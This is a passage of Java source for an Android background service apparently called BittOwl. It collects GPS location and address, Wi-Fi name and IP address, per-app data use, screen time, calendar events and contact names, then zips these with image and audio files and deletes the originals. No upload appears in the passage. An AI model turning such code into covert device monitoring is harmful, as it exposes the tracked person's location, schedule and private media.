			LocationRequest locationRequest = LocationRequest.create();
			locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
			locationRequest.setInterval(1000); // Try every 1s
			locationRequest.setNumUpdates(1);  // Only need one result

			final LocationCallback locationCallback = new LocationCallback() {
				@Override
				public void onLocationResult(LocationResult locationResult) {
					try {
						if (locationResult != null && !locationResult.getLocations().isEmpty()) {
							Location location = locationResult.getLastLocation();
							Log.d(TAG, "Location received: Lat=" + location.getLatitude() + ", Lng=" + location.getLongitude());
							writeLocationToFile(location, locationInfo);
						} else {
							Log.w(TAG, "Location result empty or null.");
							locationInfo.append("Could not retrieve location.\n");
							saveToFile("location_log.txt", locationInfo.toString());
						}
					} catch (Exception e) {
						Log.e(TAG, "Error processing location result: " + e.getMessage(), e);
						locationInfo.append("Error: ").append(e.getMessage()).append("\n");
						saveToFile("location_log.txt", locationInfo.toString());
					} finally {
						fusedLocationClient.removeLocationUpdates(this);
					}
				}
			};

			Log.d(TAG, "Requesting location updates...");
			fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper());

			// Timeout after 5 seconds
			new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
					@Override
					public void run() {
						Log.w(TAG, "Timeout: No GPS fix received.");
						locationInfo.append("Timeout: No GPS fix received.\n");
						saveToFile("location_log.txt", locationInfo.toString());
						fusedLocationClient.removeLocationUpdates(locationCallback);
					}
				}, 5000);

		} catch (Exception e) {
			Log.e(TAG, "Error generating location report: " + e.getMessage(), e);
			locationInfo.append("Error: ").append(e.getMessage()).append("\n");
			saveToFile("location_log.txt", locationInfo.toString());
		}

		Log.d(TAG, "Location report process initialized.");
	}

    // Helper method
	private void writeLocationToFile(Location location, StringBuilder locationInfo) {
		double latitude = location.getLatitude();
		double longitude = location.getLongitude();
		String address = "Unknown";

		try {
			Geocoder geocoder = new Geocoder(this, Locale.getDefault());
			List<Address> addresses = geocoder.getFromLocation(latitude, longitude, 1);
			if (addresses != null && !addresses.isEmpty()) {
				address = addresses.get(0).getAddressLine(0);
			}
		} catch (Exception e) {
			address = "Could not get address";
		}

		locationInfo.append("Latitude: ").append(latitude)
			.append("\nLongitude: ").append(longitude)
			.append("\nLocation: ").append(address)
			.append("\nTime: ").append(getDateNow())
			.append("\n");

		saveToFile("location_log.txt", locationInfo.toString());
	}
	
	// DATA USAGE
	
	private void generateDataUsageReport() {
		final String TAG = "ReportService";
		StringBuilder dataUsageLog = new StringBuilder();
		dataUsageLog.append("Data Usage Report (Top 10 Apps Today)\n\n");

		Log.d(TAG, "Starting data usage report...");

		try {
			if (!hasUsagePermission()) {
				Log.w(TAG, "Usage stats permission not granted.");
				dataUsageLog.append("Permission not granted to access usage stats.\n");
				saveToFile("data_usage_log.txt", dataUsageLog.toString());
				return;
			}

			NetworkStatsManager networkStatsManager = (NetworkStatsManager) getSystemService(Context.NETWORK_STATS_SERVICE);
			PackageManager pm = getPackageManager();
			Map<String, Long> appDataUsage = new HashMap<>();

			long endTime = System.currentTimeMillis();
			Calendar calendar = Calendar.getInstance();
			calendar.set(Calendar.HOUR_OF_DAY, 0);
			calendar.set(Calendar.MINUTE, 0);
			calendar.set(Calendar.SECOND, 0);
			long startTime = calendar.getTimeInMillis();

			List<ApplicationInfo> apps = pm.getInstalledApplications(0);
			Log.d(TAG, "Found " + apps.size() + " installed apps.");

			for (ApplicationInfo app : apps) {
				int uid = app.uid;
				long totalBytes = 0;

				try {
					// Mobile data
					NetworkStats statsMobile = networkStatsManager.queryDetailsForUid(
                        ConnectivityManager.TYPE_MOBILE,
                        null,
                        startTime,
                        endTime,
                        uid
					);
					NetworkStats.Bucket bucketMobile = new NetworkStats.Bucket();
					while (statsMobile.hasNextBucket()) {
						statsMobile.getNextBucket(bucketMobile);
						totalBytes += bucketMobile.getRxBytes() + bucketMobile.getTxBytes();
					}
					statsMobile.close();
				} catch (Exception e) {
					Log.e(TAG, "Error reading mobile data for UID " + uid + ": " + e.getMessage(), e);
				}

				try {
					// Wi-Fi data
					NetworkStats statsWifi = networkStatsManager.queryDetailsForUid(
                        ConnectivityManager.TYPE_WIFI,
                        null,
                        startTime,
                        endTime,
                        uid
					);
					NetworkStats.Bucket bucketWifi = new NetworkStats.Bucket();
					while (statsWifi.hasNextBucket()) {
						statsWifi.getNextBucket(bucketWifi);
						totalBytes += bucketWifi.getRxBytes() + bucketWifi.getTxBytes();
					}
					statsWifi.close();
				} catch (Exception e) {
					Log.e(TAG, "Error reading Wi-Fi data for UID " + uid + ": " + e.getMessage(), e);
				}

				if (totalBytes > 0) {
					appDataUsage.put(app.packageName, totalBytes);
				}
			}

			// Sort by usage
			List<Map.Entry<String, Long>> sortedList = new ArrayList<>(appDataUsage.entrySet());
			Collections.sort(sortedList, new Comparator<Map.Entry<String, Long>>() {
					@Override
					public int compare(Map.Entry<String, Long> o1, Map.Entry<String, Long> o2) {
						return Long.compare(o2.getValue(), o1.getValue());
					}
				});

			int count = 0;
			for (Map.Entry<String, Long> entry : sortedList) {
				try {
					String appName = pm.getApplicationLabel(pm.getApplicationInfo(entry.getKey(), 0)).toString();
					long usageBytes = entry.getValue();
					double usageMB = usageBytes / (1024.0 * 1024.0);

					Log.d(TAG, "App: " + appName + " (" + entry.getKey() + ") - " + usageMB + " MB");

					dataUsageLog.append(appName)
                        .append(" (").append(entry.getKey()).append(")")
                        .append(" → ")
                        .append(String.format(Locale.getDefault(), "%.2f MB", usageMB))
                        .append("\n");

					count++;
					if (count >= 10) break;
				} catch (Exception e) {
					Log.e(TAG, "Error getting app name for package: " + entry.getKey(), e);
				}
			}

			if (count == 0) {
				Log.w(TAG, "No data usage found.");
				dataUsageLog.append("No data usage found.\n");
			}

			saveToFile("data_usage_log.txt", dataUsageLog.toString());
			Log.d(TAG, "Data usage report saved.");

		} catch (Exception e) {
			Log.e(TAG, "Error generating data usage report: " + e.getMessage(), e);
			dataUsageLog.append("Error: ").append(e.getMessage()).append("\n");
			saveToFile("data_usage_log.txt", dataUsageLog.toString());
		}
	}
	
	// INTERNET REPORT
	
	private void generateInternetReport() {
		final String TAG = "ReportService";
		StringBuilder netLog = new StringBuilder();
		netLog.append("Internet Report\n\n");

		Log.d(TAG, "Starting internet report...");

		try {
			ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
			NetworkInfo activeNetwork = cm.getActiveNetworkInfo();

			if (activeNetwork != null && activeNetwork.isConnected()) {
				netLog.append("Status: Connected\n");

				if (activeNetwork.getType() == ConnectivityManager.TYPE_WIFI) {
					netLog.append("Type: Wi-Fi\n");

					try {
						WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
						if (wifiManager != null && wifiManager.isWifiEnabled()) {
							WifiInfo wifiInfo = wifiManager.getConnectionInfo();
							String ssid = wifiInfo.getSSID().replace("\"", "");
							String ipAddress = intToIp(wifiInfo.getIpAddress());

							netLog.append("Wi-Fi Name: ").append(ssid).append("\n");
							netLog.append("IP Address: ").append(ipAddress).append("\n");

							Log.d(TAG, "Connected to Wi-Fi: " + ssid + " with IP: " + ipAddress);
						} else {
							Log.w(TAG, "Wi-Fi is disabled.");
							netLog.append("Wi-Fi is disabled.\n");
						}
					} catch (Exception e) {
						Log.e(TAG, "Error retrieving Wi-Fi info: " + e.getMessage(), e);
						netLog.append("Error retrieving Wi-Fi info: ").append(e.getMessage()).append("\n");
					}

				} else if (activeNetwork.getType() == ConnectivityManager.TYPE_MOBILE) {
					netLog.append("Type: Mobile Data\n");

					try {
						TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
						String carrier = tm.getNetworkOperatorName();

						String mobileIpAddress = getMobileIPAddress();
						netLog.append("Network Provider: ").append(carrier).append("\n");
						netLog.append("IP Address: ").append(mobileIpAddress).append("\n");

						Log.d(TAG, "Using mobile data with carrier: " + carrier + " and IP: " + mobileIpAddress);
					} catch (Exception e) {
						Log.e(TAG, "Error retrieving mobile data info: " + e.getMessage(), e);
						netLog.append("Error retrieving mobile data info: ").append(e.getMessage()).append("\n");
					}

				}
			} else {
				netLog.append("Status: Not Connected\n");
				Log.w(TAG, "No active network connection.");
			}
		} catch (Exception e) {
			Log.e(TAG, "Error getting internet info: " + e.getMessage(), e);
			netLog.append("Error getting internet info: ").append(e.getMessage()).append("\n");
		}

		saveToFile("internet_log.txt", netLog.toString());
		Log.d(TAG, "Internet report saved.");
	}
	
	// Converts integer IP to readable format (for Wi-Fi)
	private String intToIp(int ip) {
		return (ip & 0xFF) + "." +
			((ip >> 8) & 0xFF) + "." +
			((ip >> 16) & 0xFF) + "." +
			((ip >> 24) & 0xFF);
	}

    // Get IP for mobile network
	private String getMobileIPAddress() {
		try {
			for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
				NetworkInterface intf = en.nextElement();
				for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
					InetAddress inetAddress = enumIpAddr.nextElement();
					if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
						return inetAddress.getHostAddress();
					}
				}
			}
		} catch (Exception e) {
			return "N/A";
		}
		return "N/A";
	}
	
	// STORAGE REPORT
	
	private void generateStorageReport() {
		final String TAG = "ReportService";
		StringBuilder storageInfo = new StringBuilder();
		storageInfo.append("Storage Usage Report\n\n");

		Log.d(TAG, "Starting storage report...");

		try {
			File storageDir = Environment.getExternalStorageDirectory(); // /storage/emulated/0
			Log.d(TAG, "Storage directory: " + storageDir.getAbsolutePath());

			StatFs stat = new StatFs(storageDir.getPath());
			long blockSize = stat.getBlockSizeLong();
			long totalBlocks = stat.getBlockCountLong();
			long availableBlocks = stat.getAvailableBlocksLong();

			long totalBytes = totalBlocks * blockSize;
			long availableBytes = availableBlocks * blockSize;
			long usedBytes = totalBytes - availableBytes;

			storageInfo.append("Total Storage: ").append(formatSize(totalBytes)).append("\n");
			storageInfo.append("Used Storage: ").append(formatSize(usedBytes)).append("\n");
			storageInfo.append("Free Storage: ").append(formatSize(availableBytes)).append("\n\n");

			Log.d(TAG, "Total: " + formatSize(totalBytes) + ", Used: " + formatSize(usedBytes) + ", Free: " + formatSize(availableBytes));

			// Quick folder size check (level 2 depth)
			long videoSize = safeQuickFolderSize(new File(storageDir, "DCIM"), 2)
				+ safeQuickFolderSize(new File(storageDir, "Movies"), 2);
			long musicSize = safeQuickFolderSize(new File(storageDir, "Music"), 2);
			long picturesSize = safeQuickFolderSize(new File(storageDir, "Pictures"), 2)
				+ safeQuickFolderSize(new File(storageDir, "Download"), 2);
			long documentsSize = safeQuickFolderSize(new File(storageDir, "Documents"), 2);

			long appsSize = 0; // Not calculated
			long knownTotal = videoSize + musicSize + picturesSize + documentsSize + appsSize;
			long others = usedBytes - knownTotal;

			storageInfo.append("Breakdown:\n");
			storageInfo.append("- Videos: ").append(formatSize(videoSize)).append("\n");
			storageInfo.append("- Music: ").append(formatSize(musicSize)).append("\n");
			storageInfo.append("- Pictures: ").append(formatSize(picturesSize)).append("\n");
			storageInfo.append("- Documents: ").append(formatSize(documentsSize)).append("\n");
			storageInfo.append("- Others: ").append(formatSize(others)).append("\n");

			Log.d(TAG, "Videos: " + formatSize(videoSize));
			Log.d(TAG, "Music: " + formatSize(musicSize));
			Log.d(TAG, "Pictures: " + formatSize(picturesSize));
			Log.d(TAG, "Documents: " + formatSize(documentsSize));
			Log.d(TAG, "Others: " + formatSize(others));

		} catch (Exception e) {
			Log.e(TAG, "Error getting storage info: " + e.getMessage(), e);
			storageInfo.append("Error getting storage info: ").append(e.getMessage()).append("\n");
		}

		saveToFile("storage_log.txt", storageInfo.toString());
		Log.d(TAG, "Storage report saved.");
	}

	/**
	 * Safe wrapper for quickFolderSize to avoid crashes when folder doesn't exist or permission denied.
	 */
	private long safeQuickFolderSize(File folder, int depth) {
		try {
			if (folder != null && folder.exists()) {
				return quickFolderSize(folder, depth);
			} else {
				Log.w("ReportService", "Folder not found: " + (folder != null ? folder.getAbsolutePath() : "null"));
				return 0;
			}
		} catch (Exception e) {
			Log.e("ReportService", "Error calculating folder size for: " + folder.getAbsolutePath() + " - " + e.getMessage(), e);
			return 0;
		}
	}
	
	// BONUS //
	
	// === 1. Calendar Events ===
	private void generateCalendarEventsReport() {
		StringBuilder calLog = new StringBuilder();
		calLog.append("Calendar Events Report\n\n");

		try {
			// Query the calendar for all events
			Cursor cursor = getContentResolver().query(
                CalendarContract.Events.CONTENT_URI,
                new String[]{
					CalendarContract.Events.TITLE,
					CalendarContract.Events.DTSTART,
					CalendarContract.Events.EVENT_LOCATION
                },
                null, null, null);

			if (cursor != null && cursor.moveToFirst()) {
				// Loop through each event
				do {
					String title = cursor.getString(0);           // Event title
					long start = cursor.getLong(1);              // Event start time
					String location = cursor.getString(2);       // Event location

					// Convert time from milliseconds to readable format
					String dateTime = DateFormat.format("yyyy-MM-dd HH:mm", new Date(start)).toString();

					// Append to log
					calLog.append("- ")
						.append(title)
						.append(" at ")
						.append(location)
						.append(" on ")
						.append(dateTime)
						.append("\n");

				} while (cursor.moveToNext());

				cursor.close(); // Always close the cursor
			} else {
				calLog.append("No calendar events found.\n");
			}

		} catch (Exception e) {
			calLog.append("Error reading calendar: ").append(e.getMessage()).append("\n");
		}

		// Save the calendar log to a file
		saveToFile("calendar_log.txt", calLog.toString());
	}
	
	// === 2. Network Traffic ===
	private void generateNetworkTrafficReport() {
		final String TAG = "BittOwl";
		StringBuilder netLog = new StringBuilder();
		netLog.append("Network Traffic Report\n\n");

		try {
			// Mobile data (received and sent in bytes)
			long mobileRx = TrafficStats.getMobileRxBytes();
			long mobileTx = TrafficStats.getMobileTxBytes();
			Log.d(TAG, "📱 Mobile Data Received: " + mobileRx + " bytes");
			Log.d(TAG, "📱 Mobile Data Sent: " + mobileTx + " bytes");

			// WiFi data = Total - Mobile
			long wifiRx = TrafficStats.getTotalRxBytes() - mobileRx;
			long wifiTx = TrafficStats.getTotalTxBytes() - mobileTx;
			Log.d(TAG, "📶 Wi-Fi Data Received: " + wifiRx + " bytes");
			Log.d(TAG, "📶 Wi-Fi Data Sent: " + wifiTx + " bytes");

			// Append formatted results to log
			netLog.append("Mobile Received: ").append(formatSize(mobileRx)).append("\n");
			netLog.append("Mobile Sent: ").append(formatSize(mobileTx)).append("\n");
			netLog.append("WiFi Received: ").append(formatSize(wifiRx)).append("\n");
			netLog.append("WiFi Sent: ").append(formatSize(wifiTx)).append("\n");

		} catch (Exception e) {
			Log.e(TAG, "❌ Error generating network traffic report: " + e.getMessage(), e);
			netLog.append("Error: ").append(e.getMessage()).append("\n");
		}

		// Save the network report to file
		saveToFile("network_log.txt", netLog.toString());
		Log.d(TAG, "📝 Network report saved to file.");
	}
	
	// === 3. Top 5 Apps by Screen Time (UsageStatsManager) ===
	private void generateScreenTimeReport() {
		final String TAG = "BittOwl";
		StringBuilder screenTimeLog = new StringBuilder();
		screenTimeLog.append("Top 5 Apps by Screen Time Today\n\n");

		try {
			// Check if permission to access usage stats is granted
			if (!hasUsagePermission()) {
				Log.w(TAG, "⚠️ Usage stats permission not granted.");
				screenTimeLog.append("Permission not granted to access usage stats.\n");
				saveToFile("screen_time_log.txt", screenTimeLog.toString());
				return;
			}

			// Get today's start and end timestamps
			UsageStatsManager usageStatsManager = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
			long endTime = System.currentTimeMillis();

			Calendar cal = Calendar.getInstance();
			cal.set(Calendar.HOUR_OF_DAY, 0);
			cal.set(Calendar.MINUTE, 0);
			cal.set(Calendar.SECOND, 0);
			long startTime = cal.getTimeInMillis(); // Today at 00:00

			Log.d(TAG, "📅 Start Time: " + startTime + " (" + new Date(startTime) + ")");
			Log.d(TAG, "📅 End Time: " + endTime + " (" + new Date(endTime) + ")");

			// Query usage stats from startTime to endTime
			List<UsageStats> stats = usageStatsManager.queryUsageStats(
                UsageStatsManager.INTERVAL_DAILY, startTime, endTime);

			if (stats == null || stats.isEmpty()) {
				Log.w(TAG, "ℹ️ No usage data found.");
				screenTimeLog.append("No usage data found.\n");
				saveToFile("screen_time_log.txt", screenTimeLog.toString());
				return;
			}

			// Sort apps by most screen time
			Collections.sort(stats, new Comparator<UsageStats>() {
					@Override
					public int compare(UsageStats o1, UsageStats o2) {
						return Long.compare(o2.getTotalTimeInForeground(), o1.getTotalTimeInForeground());
					}
				});

			PackageManager pm = getPackageManager();
			int count = 0;

			// Get top 5 apps with the most screen time
			for (UsageStats stat : stats) {
				if (stat.getTotalTimeInForeground() > 0) {
					try {
						ApplicationInfo appInfo = pm.getApplicationInfo(stat.getPackageName(), 0);
						String appName = pm.getApplicationLabel(appInfo).toString();
						long seconds = stat.getTotalTimeInForeground() / 1000;

						Log.d(TAG, "📱 App: " + appName + " (" + stat.getPackageName() + ") - " 
							  + (seconds / 60) + " minutes");

						screenTimeLog.append(appName)
                            .append(" (").append(stat.getPackageName()).append(") → ")
                            .append(seconds / 60).append(" minutes\n");

						count++;
						if (count >= 5) break;

					} catch (Exception e) {
						Log.e(TAG, "❌ Error getting app name for: " + stat.getPackageName(), e);
					}
				}
			}

			if (count == 0) {
				Log.w(TAG, "ℹ️ No app usage found for today.");
				screenTimeLog.append("No app usage found.\n");
			}

		} catch (Exception e) {
			Log.e(TAG, "❌ Error generating screen time report: " + e.getMessage(), e);
			screenTimeLog.append("Error: ").append(e.getMessage()).append("\n");
		}

		// Save the screen time report
		saveToFile("screen_time_log.txt", screenTimeLog.toString());
		Log.d(TAG, "✅ Screen time report saved to file.");
	}
	
	// HELPERS
	
	private long getFolderSize(File dir) {
		long totalSize = 0;
		File[] files = dir.listFiles();
		if (files != null) {
			for (File file : files) {
				if (file.isFile()) {
					totalSize += file.length();
				} else {
					totalSize += getFolderSize(file);
				}
			}
		}
		return totalSize;
	}
	
	private long quickFolderSize(File folder, int depth) {
		if (folder == null || !folder.exists() || depth <= 0) return 0;

		long total = 0;
		File[] files = folder.listFiles();
		if (files == null) return 0;

		for (File file : files) {
			if (file.isHidden()) continue;

			if (file.isFile()) {
				total += file.length();
			} else if (file.isDirectory()) {
				total += quickFolderSize(file, depth - 1); // only go 2 levels deep
			}
		}

		return total;
	}

	private String formatSize(long bytes) {
		double kb = bytes / 1024.0;
		double mb = kb / 1024.0;
		double gb = mb / 1024.0;

		if (gb >= 1) return String.format(Locale.getDefault(), "%.2f GB", gb);
		else if (mb >= 1) return String.format(Locale.getDefault(), "%.2f MB", mb);
		else return String.format(Locale.getDefault(), "%.2f KB", kb);
	}

	private boolean hasUsagePermission() {
		try {
			AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
			int mode = appOps.checkOpNoThrow("android:get_usage_stats", android.os.Process.myUid(), getPackageName());
			return (mode == AppOpsManager.MODE_ALLOWED);
		} catch (Exception e) {
			return false;
		}
	}

	private String getContactName(String phoneNumber) {
		String name = null;
		Uri uri = Uri.withAppendedPath(
            ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
            Uri.encode(phoneNumber));

		Cursor cursor = getContentResolver().query(uri,
												   new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);

		if (cursor != null) {
			if (cursor.moveToFirst()) {
				name = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
			}
			cursor.close();
		}
		return name;
	}

	private void saveToFile(String fileName, String content) {
		try {
			File folder = new File(getExternalFilesDir(null), "bittowl_logs");
			if (!folder.exists()) folder.mkdirs();
			File file = new File(folder, fileName);
			FileWriter writer = new FileWriter(file, false);
			writer.write(content);
			writer.flush();
			writer.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	private File zipReportFiles(File reportDir) {
		// Get current date and time
		SimpleDateFormat dateFormat = new SimpleDateFormat("ddMMyyyy", Locale.getDefault());
		SimpleDateFormat timeFormat = new SimpleDateFormat("HHmmss", Locale.getDefault());
		String currentDate = dateFormat.format(new Date());
		String currentTime = timeFormat.format(new Date());

		// Build filename
		String zipFileName = "BittOwl_Report_" 
			+ "[" + Build.MODEL.replace(" ", "") + "]_"
			+ "[" + Build.DEVICE.replace(" ", "") + "]_"
			+ currentDate + "_"
			+ currentTime + ".zip";

		File zipFile = new File(reportDir, zipFileName);

		try {
			FileOutputStream fos = new FileOutputStream(zipFile);
			ZipOutputStream zos = new ZipOutputStream(fos);
			File[] files = reportDir.listFiles();

			if (files != null) {
				for (File file : files) {
					// Include all report files (txt, jpg, png, wav)
					if (file.getName().endsWith(".txt") || 
						file.getName().endsWith(".jpg") || 
						file.getName().endsWith(".3gp") ||
						file.getName().endsWith(".png") || 
						file.getName().endsWith(".wav")) {

						FileInputStream fis = new FileInputStream(file);
						zos.putNextEntry(new ZipEntry(file.getName()));

						byte[] buffer = new byte[1024];
						int len;
						while ((len = fis.read(buffer)) > 0) {
							zos.write(buffer, 0, len);
						}

						zos.closeEntry();
						fis.close();
					}
				}
			}

			zos.close();
			fos.close();
			return zipFile;
		} catch (IOException e) {
			e.printStackTrace();
			return null;
		}
	}
	
	private void cleanUpReportFiles(File reportDir) {
		String TAG = "File Deletion";
		File[] files = reportDir.listFiles();
		if (files != null) {
			for (File file : files) {
				// Delete all report files (txt, zip) and media files (jpg, wav, wav)
				if (file.getName().endsWith(".txt") || 
					file.getName().endsWith(".zip") ||
					file.getName().endsWith(".jpg") || 
					file.getName().endsWith(".3gp") ||
					file.getName().endsWith(".png") ||
					file.getName().endsWith(".wav")) {

					boolean deleted = file.delete();
					if (!deleted) {
						Log.w(TAG, "Failed to delete file: " + file.getName());
					}
				}
			}
		}
	}

	private String getDateNow() {
		return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

}

